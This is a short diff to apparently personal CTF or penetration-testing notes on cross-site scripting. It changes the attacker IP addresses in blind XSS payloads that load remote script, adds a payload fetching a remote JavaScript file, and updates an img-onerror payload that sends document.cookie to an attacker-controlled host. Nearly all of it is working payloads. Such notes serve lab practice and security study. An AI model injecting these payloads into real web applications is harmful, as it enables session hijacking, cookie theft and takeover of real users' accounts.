@@ -24,8 +24,8 @@
 ```
 - blind XSS (may need script \[direct js to execute\], and php files)
 ```
-'><script src=http://10.10.14.44:89/script.js></script>
-<script>$.getScript("http://10.10.14.44:89")</script><script
+'><script src=http://10.10.14.11/script.js></script>
+<script>$.getScript("http://10.10.14.11")</script><script
 ```
 -  test if XSS is stored
 - for reflected XSS
@@ -68,4 +68,8 @@ alert
 getScript
 ```
 
-`<img src=x onerror=fetch("http://10.10.16.55:4444/"+document.cookie);>`
+`<img src=x onerror=fetch("http://10.10.14.15/"+document.cookie);>`
+
+
+
+`<img src=x onerror=fetch(http://10.10.14.15/javascript.js);>`
